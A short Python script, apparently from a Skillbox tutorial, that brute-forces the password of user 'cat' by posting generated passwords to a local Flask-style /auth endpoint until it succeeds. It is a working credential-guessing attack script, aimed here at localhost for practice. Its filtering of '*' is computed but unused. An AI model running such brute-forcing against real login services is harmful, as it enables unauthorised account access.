### python bruteforcer (skillbox tutorial) B.Pakhomov (30.12.19) ###

import requests

state = 0
alphabet = '*0123456789qazxswedcvfrtgbnhyujmkiolp'

def to_alph(n):
	base = len(alphabet)
	res = ''
	while n != 0:
		rest =  n % base
		res = alphabet[rest] + res
		n = n // base
	clean_res = ''.join(c for c in res if c != '*')
	return res

def next_pass():
	global state
	
	res = to_alph(state)
	state += 1 
	return res

login = 'cat'
password = ''

while True:
	data = {'login': login, 'password': password}
	response = requests.post('http://127.0.0.1:5000/auth', json=data)
	if response.status_code == 200:
		print("SUCCESS:", data)
		break
	else:
		print("unsucces:", data)
	password = next_pass()

